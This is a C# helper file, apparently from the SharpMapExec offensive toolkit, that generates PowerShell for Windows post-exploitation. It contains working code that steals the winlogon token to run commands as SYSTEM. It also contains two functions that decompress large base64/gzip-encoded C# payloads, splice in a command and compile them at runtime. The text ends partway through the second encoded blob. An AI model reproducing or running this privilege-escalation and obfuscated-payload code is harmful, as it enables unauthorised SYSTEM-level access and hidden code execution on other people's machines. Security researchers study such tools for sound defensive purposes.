using System;
using System.IO;
using System.Text;
using static SharpMapExec.Helpers.Misc;

namespace SharpMapExec.Helpers
{
    internal class PsFunction
    {
        public static string ImpersonateSystem(string command = "[System.Security.Principal.WindowsIdentity]::GetCurrent()")
        {
            string function = @"
$advapi32 = Add-Type -Name 'advapi32' -Namespace 'Win32' -PassThru	-MemberDefinition  @'
[DllImport(""advapi32.dll"", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool OpenProcessToken(
    IntPtr ProcessHandle,
    UInt32 DesiredAccess,
    out IntPtr TokenHandle);

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool DuplicateToken(
    IntPtr ExistingTokenHandle,
    int SECURITY_IMPERSONATION_LEVEL,
    ref IntPtr DuplicateTokenHandle);

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool ImpersonateLoggedOnUser(
    IntPtr hToken);

[DllImport(""kernel32.dll"")]
public static extern uint GetLastError();

[DllImport(""kernel32.dll"", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
public static extern bool CloseHandle(
    IntPtr hObject
);

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool RevertToSelf();

[DllImport(""advapi32.dll"", SetLastError = true)]
public static extern bool SetThreadToken(
    IntPtr Thread,
    IntPtr Token
);
'@
$isAdmin = (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {{
    [intptr]$hToken    = [intptr]::Zero
    [IntPtr]$hDupToken = [intptr]::Zero
    [IntPtr]$handle    = (Get-Process 'winlogon').Handle
    $Success     = [Win32.advapi32]::OpenProcessToken($handle, 0x2, [ref]$hToken)
    if (!$success)
    {{
        return 'OpenProcessToken failed!'
    }}
    $success = [Win32.advapi32]::DuplicateToken($hToken,2, [ref]$hDupToken)
    if (!$success)
    {{
        return 'DuplicateToken failed!'
    }}
    $identity = [System.Security.Principal.WindowsIdentity]::New($hDupToken)
    $output = [System.Security.Principal.WindowsIdentity]::RunImpersonated($identity.AccessToken, [Func[object]]{{
        {0}
    }})
    $null = [Win32.advapi32]::CloseHandle($hToken)
    $null = [Win32.advapi32]::CloseHandle($hDupToken)
    return $Output
}}else{{
    write-output 'Not admin!'
    return $false
}}
";
            return String.Format(function, command);
        }

        public static string RunAsSystem(string command)
        {
            //string csFile = Compress(File.ReadAllBytes(@"C:\git\ConsoleApp1\System.cs"));
            string csFile = "H4sIAAAAAAAEAOU97XLbOJL/p2regVFd7UoThbGdVC6bmcydLNG2biRLI8rjycYpFUVCEtcUyeWHP3acJ7sf90j3CtcNgBRIApTkOLNzd/oRWWCj0V9oNBoN5r//87/S2PWX2tC1oyAOFol+6fqvjnTTWpAzy3c8En//7TcMxryPE7Iu/dS7gecRO3EDP9ZPiU8i1y6D9Fxr6Qdx4tplZHp/VG0BlOswInEMOMtPB67/93LbJPUTd030vp+QKAhNEt24doVu3SR2GrnJvT6OXN92Q8srQ0zJXSJr0ydkmXpWZNxlZFWQT1cRsRxogAfffuNbaxKHlk20LsAGHumE4dG33/yGzzT4hOncc20tTiyQiWZ7Vhxrxl1CfIqbwfzGvqrgfcNP1ySy5h75IU6Al+WPmhl6btJMVm6ssSb8amuun2h+a4NIwIkfd6E1TQqu9+Pz1PNGkbEOk/smdG5pDw+ar/2gHbaKnUo48JOsouBW88mt1omWQJufGHc2CdEmmq3vi/CfMxlkn4gkaeRrG6b0ieUvSfOgjTzoA+Ivk5X2ssCH7AP6RTtsutr7H2lPM50zWUDTd5rfBgwiMZ/Zn58LGmGqGEfBMrLWFT187Hlefx0GUdJsXJPIJx7MFMfzGq1PAhBj6J02tKJ4ZXmduHnhry3fWhJneh8S/TgIPLFDUbtgboBZmwOQ1gWbSghQA9YcN7livRCMCTpYKN5zMLS2lj+BiQMjOTBJoDUiC800uheT/vTDrDOdTvrHF1PDBDCOsZNAv3makLgOmFm2CEtpm/f9Fcz1hDuJtpaisTm3lGag7MSzltAKc3KcRIDG8G/cKPDROESC0yiClp4bgeqC6L6tfez7nxg1085kejHun5+MjF8B1EysKEnDvr8I2lqQJtp4MuoapjlDiMmwM+2Pzje8IVi0ppS0vhdNTqnDtmaSZGDFiRFFQaS915IoJVv1dAEMvjrSLi03OQkiE7jyyGj+NzREzvqKCqidQa5dz3NjYge+Ez8VZU9ochehw02upPdmrsm8aeDGSa73or5zGMECfrG8dPPbnpvuP8TH44jcuEEaF8G8cEJ5Q+A/oLj6vpu4lgfESUSG8lGKjUktb+wGqZ+3clniLMi7/0EF0AOnK7WXGub/eWxE7g1Yt5SPlPlUHvTkk9cM0sjOXPAZn8rFh+XWqRUtSVLqUtAlg8ge8QnUIzF4QadjYzfwg/VMyZxwjmpEl94ncy81C5QXxGWJMe/3VcfmQ41C4meLI+U85OsaF6FURAJc31FTaTk3Vuj+MyxR4GoaXBM/E2zJoPhyUrIaXBc5PO3MoJ+KzRqqT0lCBxTW3WaVkLY2Hf1knItL9qw76JimVu7cxUAsA4dQYNo3p/1uFY7bfLmZRY1MHhSArSKseUfb3JFzHqS5IWkK0g9XE/CG2FpQSri6BFskrL0mQIPnYsRFWXjSNbCGITNzTRJd8tnd1s46572BMTsZdE5N8DhDK76uNNJl7HcgeEzINQbCVNzlsIv/nKeLBYnyn/4x/V0IQeb3IGvUGtMMlTlt69xYrpeDHWPTgCySKey2hjDrYJLvzGR3ZUXAKPDH/9I7aRI8zgsifTDt+A5zlCZhmnTHza/qeflcimGvxtb7XNzs5/bB5QNLJQO74V2XgkFgwa5nHlnRfVO5cg7GsNmFpTPffZy4HkHDEbeFW6mXE9qG/btlJ2ZIILwH5BlbX7C8nbIgouM4mHTIBT0MnNTbbPpwLduPh6pzU67vzFmxhWdI1rBBy8ngrUKgfmzFhBPbphPn4yds5RMv92AFf+iF5+l6TqLRgk4rHC8h/h+Ml9xeHsvLFpva1SDYSjMB2pPy7KtyUN228+AQ9tH2dWnvRffWOb+bLZkVgWUlyLJ8d1/gno1YF1Rtd0DyabSbgn9xoyS1vJOIEOOuRjJlPkEkVBrZRhb6o7vY0wifkh1OGGeo43mBvRtHmYo3/CxYd6o05CpvBiwJj9P34lK+gu3h05j/4puGfGqx1q/ryNDd51LEH7mbyqIDHlT7hYk8DWhvZu0cQj7XefYq18vohkSeFYaEzwmBHViJUhvs5R6QNtnXT67v6Cb5e0p8zCnIRH3hu3bgyA0I8RWTZsq8L+8jAGtCdu17KbB8K1/Mp/6u/G3jjinKnsvZyQ0PghkS3RBnCxjss66TINwCNXUTjyjlB+Q4t7/WP/6wpTdO7S0YtoP8SrNNKPR4C65dAWE2eblhbAHFpUMJcvhGuzVXwe0lGEtwWwdmzzPVHW2x2N3gVmbi9H2IobdCsVB7KxhdCL5ggqhngSTzvcNsEBePeuLZSi6HYStMlmWvBcoCgq8iA8nGeZsMaNjGUgBbLCY7KoRZb0dumFA9Frtsyc9J8UsSUl9FNoOLfm+bMGgYMAhuIcZTmDKFOHOXqxLI09FZzu5soxn54qkeheFRCAhIVjg0i3pUoLiSv3kNAVroRiw8ctcK18XonH4YG2x01LMcMrfK/nBsTMzROctxDYxfjIEG8QuJ4sDnGaob4qkpw9TevW+tXRu971K1PhVBaaICj1BrgU+jIA2pY68FG0fuDcRIS1IDSsUNoZu7cEndRKc+v2oGxE/XgnCV6qdCB3rWsL2HaOGwLXlcEO5j6KhV3Tt0Hkr6MnfR8QP/fh2kMRB50JbD9B00zQU3Tgk3OaDIEMAdKeDwBGaZAb0SOC+4rCx9Joi8koStl/8FLKIq4VOTimVPciuSPh3d+hB2q5VN8cqe98jCSr2kZ9me7DE7mJE9oXugbeZD56YUL+4saB2L7CnEGRAB2QlxTNeRQpiseqTvqIXY8Z16mXEcEwI7FuLLuTRhbTkO7vog3UT2vJM6bjIOwPbvpWqJ3KXry54YHrnZ7CUlAAPXv4aFEP+s7S97eGbFmQjx+EpKuF063JcB8X2z+w8KgfvfWyKVeBHQ8NF1SgGxsmiJk01pGRd9fgQjeTYEbVhY3aCW+CBYBj5YTenZ0LrLTzboicjOjk2c7oW0/Du6riun+nngE4n36p+fGeAcJfMfYtGp0Z3OTiajIbiRkWmgr3qMAx6Lp3cUcBuxoFqk9e7g4PDk4OTkpCxZEq1dH8XAgOinTD9LqrFQVYQru1tuKyxzOAJnkbncvMfbuh6TIvrDsoALwDTfIEAflaFLp9UC6OsyaKGGqEBudYVKfk6DxNoAHR5IYITJt4E8qkD+nJLoXgr7Wg47cNfAtSPrAnRUCLn37VUU+LDXzUyAIlcYXlbeBW4lz+FA3Hne60x6s0n/9GxqzibGzxf9idHLhj1BfN/vi6OT9z/aoT9biWHt7Z+ez8aT/rAz+ZD1P9ypb+9iPOh3O1MjH3anbpsgJ+/4eqeOP18YGxLf7t5lZo4uJl0jV9Zugun9x4U5RcH80h8Yp4bJux/t1f10MroYZ11f79W1Z5x0LgZT3vftXn1N2KJDbNXnBnG4ozFwE2pKTetBFGkx0V5Dz2Aw63QxYyDHy83+QW6NDyWnWrK6B4lBFags/srMQIq1qu4HqSYf5Eqqw5kro5yJLeaMeVEXnnH3BoNqyt3Mi2vhMc1WKxcn8VQ5qKSLsjo5TM6D00fFsKZWKetfTvfrfyVR0NZowUuruSEkK5R9rh222mBv1GfC9+uDcgWu5CBsM0hGUFvgUfybD/P8kKXDM+7KY3D2mCTpcUjpNLN8EFBK6re1hnCk22ko8K/ydVtyNqaQ3EE7J0tk96CeISyVzkd7r/mp522vi+alzQvLi8tb8s/Fny9faph+eIEkuLF2eKDxElFd14uQ+Qm8h4lzWd0pJ7OtsRWxon8Yq7si9rV2uyLJCjZ1CWMLa+gdFEJlTGQ+G3ITQbw9GGCNeOXB4cFR5cEJ/2yXmSjoZ1JBKzriR6xHEyoSymCfv0RVDK1ueoSEzUOJfIvnkLKpVbTHu7cSJNvFIBHBDuyXmOFs46mkKnkjcZDUg0yDQrkNzZ7zgzJ+HmKzanS1i6S2DAZHJ12JUH4yZ8/Byg3fDvBuhd4xu/2+Dr6Dnro1+QDg8xpX/lVU8RIoxGebo78CjfY8c6L2XBfLxTJ6Cmpq7SB8VoejU/xYgd9swIbn2afN2SNYF/wLEy3QyB2x04Q8e6f9dvC50c7qBpE1PEOmd3Do+UGzJTPg3a11bwVz3eF+5SQK1gUdl0+e+WEIq5nKlASbOf6HWvF4uwglwrcvcX7ZCJSN10iKz5uFcSjTZaHcWJGG5k5TVBRDAj/XE9rUxAZExxqbm+HatJntOHWG/vXBX95kg7RzXtrs4L40KpdVlHnjRqNsxDhbyJ2LD2XKSqL7rXblBDu7P7R36YqQKw78VYt6ZMVlGgVi/HA2SpYkfipXe7KPvbIidsquMVemQJBX3E3Y8ZMcalOYNw2ybbUSmGogJOR6Qg+ai6WCBbsqOGX1DywNFAYvegklGaiZnAomRO1Pfypy8SitIGKmGV5bogatwUIlBXPjWqEY/EgWzexDwLIfPS6EOYnrK42qZmilvaFQRNH+SGd1jWiK1oTAaoNiRgwehVq10POTgoPcoqEf81HU1TQBEw074VvfFCbX8sO5eYSdcB/1nJHO78XByKohpbL9DCEjrmNNmTNko1D2aBwiu/kn/ly4vuV52/0fXcQ3LlvvxxS9s3tUKHSWUyahTr6MMinuESkVb/DRuwcWXnjLz893D5bYxh5R4PH/bHqGCYHN6fds3JkY57h5HvGdvjQJtQumYX/aP2XnQuMRbPM/iMj+VYrMC4CFrCyhC/ho7wqi2fFg1P1pdk6fdScjc3QynR33zzuTvmHOOoPLzgdzNjqn4/Hdy0EtA7Qe6GR2Adv7aY/luXPWD0opF2XPs9HlZf+8N7os5ImlPeNVEEHfy9lZv5cnzuSDMNBMJr8MZ6OxMWG3FCXZs5p+l5N+nqQ7ko9Fl0Tj16lx3jN6M6FICszBMMEs8iGV5FIUVHMG6GcmCuStVAkYchFe61gTvqoHy3NI7NigmCCs0UGps9kZGpv01iZ/LyE3tvht1SxIrNaQVAjO++i8dERgFyutRotmDqLuWyz6kIdRG2hZAQr0ESKNyvJUjcgVGRMGQPckaoi+X4+B76KqiYX8YILfv9Bs6gAd7W8pnXeabZVDhQwtdBVoq7Cr7sKIre0AlDHcWghxX/FZ6f5OISYUGvi2EcO/XFFt7S/0U9a79AZNAbF4JKfzwzUIBiSpGsrgbmQzQWyozve6X0Z0jqaG6Opco6WkfJ5J6tUq84zOT9e4y6amWMjarA4BkjmGjWMaEdxOxxBWJyuC2YI1wbpcLVjQBrHElRUdZT1g6gaLZmGYVintheToQmGsTpMR5ckPQIrsJL/yjGv9TuYsuWu6ZdaDFOgQsXbrep42J1pwQ6JbVo2MkVMp2sDYcQuPeRkkDK10BdJeWeF7jYuR9mPllNWO+2+V6S6ryvHukSIaIbtqXaswETxObX6yuutdcL6RPKLBP07NzeVu2SDIVDbIw0NOXoG+x+wHlBmk7KPcXlEtlgrBhYlB85xnp14wt7xmPW/7CE826n5SfMaH+32lBXO04zibF+y8CHzvXusNBnh1K2FvzpH3zN3IEGTDSrxYBYlK2Nwi6uSQ9aOTjFZANqv4208Xym/XvPqNE2p9SG1BDV4uHhA/2bHbjluhGkwSOW4fVlBZDbToOHaC+jrTQJniPskT27gS8+v12joXhxZSeTwy240f5fTik4S5/XzRFF8NwI9Kq+VFerE25kFSgaSXKm1aPDXcLq+sKrrxYA/fynSDyzTu7VLP0bDUEH0mvrfKo3GKlVmy5uED6OBgJVxwD1Jl75lCqNqXbWiL1K9xJsVg5KncB8A3Bcztgh7U6dD/JbO/mFKpnfobEfwfm/NfsvRlgS1/yxPm39l8wZnPG7NZ2tIrFyJkqM4J3lhgyKqTfPsEbvN7mZLpWyO98tthMo7apd3hhjwWk5Q2tTRWYeMrkh8P8sRG+fhxB73tn5oRP1+i9R0klu1UFfLKHv9/kNbLl48fu34bVrS9fVBsdmSPx5HvIUWVyvPu1cYKRn5tEPBJ87YP0kSwZLQKYuGyISJniV2pM6BJjX0yh1mnZN9OYU2uMawkGfGT1PRIpD3oJC2eTsiVi8e1ivWn0X13dcU0YF5dsRdhvjqCJirOeBzckshcEc+7uro51A+urkJsibFFJ3dEe4FVENr8PsR3Lr7wA3qO+eJWW7mOQ3xsCSFYlI+N3iKM654myqfMp8if1SbRHyoJchWawk5/b8HSfB1YqqorJvio+co8nao0ShW7o/ppMPZk1SmMhVqXKDnRLRQv5R5DvjC/fFllJ3MUtSH5piMip/3kI1TSTTWi3dSLcveXl1s0rAYWJ63pvzH919Ud+o1VjvWxzlx4s8CWqGhrijH7ZJBi6CQ9onqonEBtdj67CFqgznIcSQGo+MYehZieN3gpaKeBT2OXPgHS6TdehGIdWHvgKwXKa8lCK7FX3BfTpleqI3sK+fHgEz1Qel0+pytCHTKoV+XDqiLUEYPqlk/RchLxtHizLVLV6LapNNsMKf8qVK/NFa/RET9fKQlwzBw5cyPUdVz5j97sS0cWPQRKY8faTpvqvZm/k1iTVcns6zYV3BJ9GrAicTl70nAHYkDmcbMqgLgKI9ZcFk5lGu6iuSTJizUtp4ZFEbfRHlCqvbA8r/VbBOZzQ2SPT4LIJp+ls0Y92r/M37wGA/3zxBgPOl1jaPx5XwRBFl1C8P+CVagJ7/5m1s4q9fbFzHoVMRdfJ66f/tUNeRngx9Jonz6Csm9IlHx69w5LH/EdUG9ec2Ui2632xxI24e9h4BDo2CM2b2s9jnrAGd5PgyYX095YHIve4Poovr48K80E+tJk8RanYsYWGwWMthNF1j3Y7J7jueROo2M2yhcrNsZ9jWdTPCm4y7pPcasWfloRHScOEF59XK1BFYqHgevs76bsvXkyxnlxTm6yhbLY8mpfOOHNKNiK9YiiXZI7fYh+qsla29q/N5r/9sP7sanRKJuF1FdXMY+yf9RQ8ldU9K2P+sOV/3B1+XB1++m7RkunySjJuFVnxkmQC5vWoG94wjr0+jMnlQ8taZjj268yX1Iw8ciCspcvNazNl+Rd5SKQHnc9Vhb170uWDbUtFYu8ZBncXftLxCxDJ6Q1VdORKTdP+WM1Pr9OwgpAJBOentIWps6TWFYR5Y5cC7RsLls8FSk7X0ARfm6vzGeOvVksFCziQ6dP5zgtivd46cv7fP6PKtfRqj0gRBN6lN9lVOoTb3JEQgE+UMuaKlmOYldAvnvXjCKTJDBkUxy5BpQFnOJYVYOm1ZmuU8xS8z9JfHyPdePNhhdD2NdoweZAr7xZRh4sfgd7bNfJ9tIwQoXOQhoGAGBdbVTpE7Snn3hpvFLKhnK7BYbLb2MfW6W3MYwqbeV1snITgj95/r5gK0KwXAefK00Nz1eJoPxqrpr5dBOAsoeW6x/x1xDCFtGKlrG6BBe9BUJkdy0lJfsS7yCxio8vPmlDN6YHexb/L1OkgRdjq37d281uyV3oBRGJFKZbrEIGXMgnQG638EfZd1btXNQU//r8P/AcrL6WaAAA";
            string function = @"
$b64 = '{0}'
$output = New-Object System.IO.MemoryStream
$Stream = New-Object IO.Compression.GZipStream([IO.MemoryStream][Convert]::FromBase64String($b64),[IO.Compression.CompressionMode]::Decompress)
$Stream.CopyTo($output)
$data = [System.Text.Encoding]::utf8.GetString($output.ToArray())

$data = $data.Replace('REPLACEME', '{1}')
add-type -Language CSharp $data
[ConsoleApp2.Program]::System()
";
            return String.Format(function, csFile, CompressData(command));
        }

        public static string RunDelegationWalk(string command)
        {
            //string csFile = Compress(File.ReadAllBytes(@"C:\git\ConsoleApp1\DelegWalk.cs"));
            string csFile = "H4sIAAAAAAAEAO0923bbOJLvfU7/A+PTZ0aeVhjbyelNp6d7RpFoRxPJUoty3Bnb60OJkMUxRWp48WXa+bJ92E/aX9gqACRBECAlx+mZveghloBCoapQKBQKBeS//uM/09gLroyhN4/COFwk5qkXvDwwbWdB3jmB65P4h6+/YjD2fZyQlfTT7Ia+T+aJFwaxeUQCEnlzGaTnOVdBGCfeXEZm9kdyycAL/i6XTdIg8VbE7AcJicK1TaIbb16hzLTJPI285N4cR14w99aOL0NMyV2iKjMn5Cr1nci6W0ckjpGZCtgyIo4LBVDx9VeBsyLx2pkTowuwoU866/X+11/9+vVXBnzW6cz35sbcd+LYGEfhVeSsWA0HwM9Zz/f7q3UYJa2daxIFxAe5u76/s3shAEUkSaPgjTF0onjp+J24dRKsnMC5Iu70fk3Mt2Hoiw1413HigLgNYA0wGzMAMrpAf0KAGpBc3IqTCJnz10A4NHBwAI+BqbaR13TDFfTkwoBAaUQWhm11Tyb96cfLznQ66b89mVo2gHGMnQTazdKExHXATIoiLKVt1g+WoDkJV7m2kXpBYri3lGag7NB3rqAUxn+cRIDGCm68KAxWJEhEgtMogpKeF4FChtF92zjrBxeMmmlnMj0Z948PR9YvAGonTpSk636wCNtGmCbGeDLqWrZ9iRCTYWfaHx0XvCFYtKKU7NLhbxzDtmGTZODEiRVFYWT8aCRRShrH6QQYfHlgnDpechhGNnDlk9Hsb8BNi7O+pAJqZ5Arz/e9mMzDwI2firInVLmTtctVThr3Vj6SedHAi5N83MvjncMIGvDB8dPi93xme/8Qq8cRufHCNC6D+esJ5Q2B/wXF1Q+8xHN8IE4hMpSPVmxManlhN0yDvJTLEmdB3vxfVAA94hOlvtQw/89jI/JuQLuVfKTMpvIlNJ+8dphG88wEv+NTuVwpl06d6IokUpPSWDKIrIpPoB6JwQq6nTk2AztYz5TKCOeoRmu6uH9Rw8cWKD+MZYkx6/dF++ZdjdYkyBZHyvmar2tchEoRCXB9V0+l4944a++foYkCV9PwmgSZYCWF4suJpDW4LnJ42phBPxWbNVQfkYR2KKy7rSohbWM6em8di0v2ZXfQsW1DbtxFRywDB1dg2ren/W4Vjuu8XDwgwVWyZPKgAGwVYcUb6uaGnHMnzVuTliD99XIC1hBLS4OyXp6CLhJWXuOgQb3ocVEWnnQNrGHIzkyTYiz57G4b7zrHvYF1eTjoHNlgcYZOfF0ppMvYb0DwmJBrdISpuGW3i/+cpYsFifKfwVv6u+SCzO5B1jhqbGSozGlZ58bx/BzsLRYNyCKZLr14CLMOJvnGTHaXTgSMAn/8m9lJk/BxVhDpg2nHdzOjNFmnSXfc+qKWl8+lOF0Rtt7n4mY/mztXd6yUTBB7my4Fg9CBXc8scqL7lnblHIztJIKlM999HHo+QcXZiGo1gW3DunPmib0m4NYD0oydz1jWjpjz0HFd3NjmAh6GbuoXmz1cwzajvWrMtOs5M05soRmSFWzI8u55qeCYv3Viwols04lydoGlfKLlFqtk//z1cbqakWi0oNMI+0vIpju0L81Drhdfhodm+nkHbEWZAO2JPMuqHFS359wJhP3y/FraY9E9dM5vsfVyItCkBFlW7+JL3LMe65ynZkOjnjaigBQj+8GLktTxDyNCrLsakcgMgiyoGLKdKrRHe/Bb0s8p4Rx0fD+cb8ZCNpgFAwvWnA4PspEXA5ZkG89bvRZtYaWYReLufz55WOmXMU1osHOp4Y/c8GTrO3eLg9IUnYa0NdNjDqGexTz+lI/D6IZEvrNeE67tJYZgNUnnoBr3gLbF/rz3Ate0yd9TEmBcQCXkk8Cbh656NUB85cBXASTEIYU2ArAhRMh+UAKrt+MC7KffmL8m7thQzWdqdnKVA4eERDfEbQCDvdJ1Eq4boKZe4hOt/IAc9/aX+uqPDa1xMjdgaAb5hUaMUOhxA65NAWE++bliNIDisqAF2f/OuLWX4e0pKEt4Wwc2n2VDd9CgsZvBLe3E7QfgBzdCMXe5EYza/M+YIPpZoIhebzAbxOWinni2Sqth2JqSRcprgbLF/ovIQLH5bZIBdcnYNr5BY7KjJZj188hbJ3Qcy00aYmxK/Iqg0heRzeCk32sSBl34B+Et+G8aVaYQ77yrpQTydHTKEZommpEvHq7RKB6FAFdkiV0zP0cHimv5d6/AF1t7EXOIvJXGdDE6px/HFusdx1kNmWtlfzi2JvbomMWpBtYHa2CAB0OiOAx4lOmG+HrKMDx3Hzgrb47W90q3PpVBabDBmemWIA58FIXpmhr2WrBx5N2Al3RFakCpuMFp8xYeqZvo1OZX1YAE6UoQrnb4qdCBnhVs0cFb2G8rqkvCfQwdtUP3Bo2Hlr7MXHSCMLhfhWkMRO611TB9F1VzwZVTwU0OKDIEcAcaODxFucqAXgqcl0xWFgITRF4JpNbL/wQWUZ3wqUrFqppci5S1o9sAHG/9YFO8qvoeWTipn/Scua+qZocrqhq662lSHzo3lXhxb0EzG1S14GeABzRPiGt7rhLCZtkGfVcvxE7g1suM45gQ2LOQQM2lDWvL2/CuD9JNVPWd1PWScQi6f68clsi78gJVjeWTm2L3qAAYeME1LIT4tba9qvKdE2cixCMoJeFz6YBeBcR3yt4/KATueG+JUuJlQCtA06kExEyUK5xsWs046fNjFEXdEEbDwQwFvcQH4VUYgNZIdUPnLj+doKcaGxs2cbqXQutv6LqunerHYUAU1qt//M4C46iY/+CLTq3u9PJwMhqCGRnZFtqqxxjgsXgCRwGbiIWhRVrv9vb2D/cODw9lyZJo5QUoBgZEPzL9LGDGXFURTja3XFdYVHAExiIzuXmL13UtJmX0+7KAS8A04iBAH8jQ0omzAPpKBi3lAZXIra5Qyc9pmDgF0P6eAkaYfAXkQQXy55RE90rYV2rYgbcCrl1VE6CjQsh9MF9GYQB73UwFKHKN4mUpWmBW8igO+J3Hvc6kdznpH72b2pcT6+eT/sTqZd0eIr4ftsXRydsfbNCercSw9vaPji/Hk/6wM/mYtd/fqG3vZDzodztTK+92o2aFk5M3fLVRw59PrILE15s3ubRHJ5OulQ/WZoLp/eXEnqJgPvQH1pFl8+YHWzU/moxOxlnTV1s17VmHnZPBlLd9vVVbG7bo4Fv1uULsb6gMXIVaStV6EEVajpHW0DMYXHa6GDFQ4+Vq/6DWxgfJqEpa96BQqBKV5V+ZGiixVof7QTmSD+pBqsOZD4ZSaDxmzNOy8JS6NxhUQ+w2i/OBiwLVNEqtXZrEc+GwEizKMt0wGA8mH4eFFe1KUX45vG/+lURh26ApK7utghCThTWMb4393TZoG7WY8PfV3q7UteKIq+gkI6gt8Ch+F7phAfGMP7kXziCTJT35kE4m5SMAKazfNnaEY9nOjgb/Ml+3FedeGtnttXOyRIb36hnyFkYr7+1HI0h9f7cMISkAflhmj7Fw/Fjekn8q/3zxwsDww3MkwYuN/T2Dp3maplmGzE/RfQycq3JHOZltg62IFQ2AvrpLMr82bpckWcKmLmFsYc61i0Ko9InMZ10WHsTrvYHx8GBUKvb3DioVh/zTLDNR0M+UgtY0xI+YUyZkFchgnz5nqBha0/YJWbf2FfItHzWqJldZH+9eK5A0i0Ehgg3Yl5jhbOMBpC54ozCR1IZMw1LKDI2e86Myfh4yZxnleiNJdRkUjk46iVB+NjefgZZbwTzEXHyzY3f7fRNsBz13a/EOwBztnAfnUcVKoBCfFYd/JRrns8yMzmemmPKV0VMapt0NhM9yaUyKH7PoWzuw4Xl2UZw+gnbBvzDRQoPckXmakGdvjF/3Pu20s9w/ZA2Pi+mtDHp+0NpVKfDm2rr1APOxw/3KYRSuSmMsnzXzwxCW95QNEmzm2Bf9uON1ExQI373E+e0TGOuA3Er1rVI3lGdZJjdOZKC20wgVxZDAz9WEFrWwANGxwlbRXZsWsw2nydC/2vv+u6yTds5Kmx3RS71yUUWZMd7ZkXUYJwu587BSNVZJdN+oVm64sfVDdVcuCPm4gbnapQZZYVJrEOOHsyEpkvj5JB+RZJ/50onYMbvBLJkGQZ40N2GnT2qoIrduGma7ai0wHYE1IdcTes5czvYr6VXJJut/YHaf0HnZSGjJwJHJqWBCNH73uzIXjxoVRMxGhmeR6EFrsFBJwdy41gwMfhRrZvYhoNmP7he8nMQLtEpV07VW31Aoomh/orO6RjRlbUJgvUIxJQaLQrVaaHmh4SDXaGjHbBQ1NS3ARL1O+GsWucW1/HBuHqEn3EZ9y0hnhgsp0HWplO0n8BhxGWupjCHrhbJH3ZBWg+ex8ALH95vtH13DC5Nt9mOK3t3cKRQaqylTUKdeRZkUt3CUypfw6PUBB++s5cfnm/tKbF+PKPD0/3L6DuMBxeH35bgzsY5x7zziG31lDGoTTMP+tH/EjoXGI9jlfxSR/ZsSmR8CC1lWQhfw0dYVRJdvB6Pu+8tjWtedjOzR4fTybf+4M+lb9mVncNr5aF+Ojml/fPOyV8sATQc6vDyB3f20x8LcOet7UsRF2/Ld6PS0f9wbnZbCxMqW8TKMoO3p5bt+L4+bqTthoJlMPgwvR2Nrwi4aKoJnNe1OJ/08Rneg7osuidYvU+u4Z/UuhRwpUAfLBrXIu9SSS1HQkbNgfC5FgbxWDgK6XIRnNdZ4r/rO8hASOzUoxwdrxkBqbHeGVhHdKsL3CnJjh184zZzEagpJheC8jckzRwR2MdFqtGjlIPq25ZwPtRtVQKvyT6CN4GlUlqeqQ64JmDAAuiXRQ/SDegx8E1WNK+TnEvwKhTGnBtA1/pbSeWfMHdlVyNBCU4G2Crv6JozY2gZAGcNtrMHvK9dJV3BKPqFQwHeN6P7lA9U2vqcfedyVl2BKiMUTOZOfrYEzoIjUUAY3I5sJoqA63+p+HtE5mhqiq3ONZpLyeaZIV6vMMzo/Pesum5piHmur2gVI5i1sHNOI4G46Brc6WRIMFqwIJuYa4YIWiBmuLOcoawFTN1y0St3sSlEvJMcU8mJNGouQJz8AaYKT/NYyrvUbqbPiumjDrAcp0C5i49bzfWNGjPCGRLcsHRk9J8nbQN+xgcc8CxK61poCZassxb3GxCjbsWzKasPtt8p0l1XleHNPEZWQ3ZauHTARPE7n/GB10+vcfCN5QJ1/nJrF/WxVJ8hU1snDQ05eib7H7Ae0AaTso91e0VGU8sCFiUHDnO+O/HDm+K163rYRnqrX7aT4jHf320oL5mjHdYsXV56HgX9v9AYDvIWVsKdU1C1zMzIE2bAML5ZAohM214g6OWTt6CSjCZCtKv7207nyzSOvfzRCPx5KXdCDy7kD4ic7d9twK1SDSSHH5m6FIauBFg3HRlBfZhpoI9yHeVwbV2J+Q95Y5eIw1lQejwx240c7vfgkYWY/XzTF2/38rLSaXWSWU2MeFAlIppRos8tDw215ZdXRjed6Sy+GpQKWadzbpb5rYKYh2kx85sinfoqTabLhYwU0cDERLrwHqbJniRCq9r0MY5EGNcak7Iw8lfkA+JaAuV0aB3049H/I7C+HVGqnfiGC/2Vz/nOWvsyx5Q81YfydzRec+bwwm6W7ZuU+hArVMcELCwxZdZI3T+A2v4GpmL410pMfeMk4aku7w4I85pNIm1rqq7D+NcGPB3VgQz593GDctg/NiJ/PGfUNJJbtVDXyyqr/L0jrxYvH912/DSvr3jYoih3Z43Hke0hxSNVx92phBSO/NQj4lHHbB2UgWNFbBbFw1xCRs8Cu0hjQoMY2kcOsUbJto3VNrHFdCTLiJ6lpkShb0ElaPp1QDy4e12rWn53um/NzNgL2+Tl7N/HlARRRccbj8JZE9pL4/vn5zb65d36+xpIYS0xyR4znmARhzO7X+Gzi8yCk55jPb42l57okwJL1jqZrNBaV+yZiZaKrpAZFXVUbQH+oBMc1WJrX7RqR0kgd6KimGiN7VG9VJk6XEqVz2nHcqRf2ZFkpjINaW6g4yi0lLeWmQr0iv3hRZSezELW+eNEQkdN26h4qcaYa0RaZotzu5XkWO84OJiWt6L8x/dczXfoXsxvrnZyZ8KZAgzvUGFvMPhmk6DMpz6YeKkdPxZZnE0EL1Dmuq0j8FF/baRATyLHDAGKP/gXq6V+8A8XasPIw0MqUp5GtnWS+5HaYFr3UHddTyLO9C3qY9Eo+oytD7TOol/JBVRnqgEF15RO0nEQ8KS62RLoE3TYVaJsh5X9KiWsz6UUZVV9fKADwlhlxZkmo9TgPHr3RV/YsGgmUxoZpnXM67i3rbk7ou4aGKkNmW8up4ZaY05BliKvZU7o64P8xo5tlAMRVGDHdsnQis+MtWlckeb6imdSwIuIW2gdKjeeO7+/+GoH63BBV9WEYzckn5azR9/bN7LtXoKC/n1jjQadrDa3fb4sgzDxLcPyfs+y04mlok2k7y9LbFjNrVcYMKLvhKnvi2Tz6q7fmKYBnUm8XZzDYNyRKLt68waxHfNrpu1d8MJHt3faZhE34PgxdAg17ZM7Ldh9HPeBc30/DFhfT1lhch17e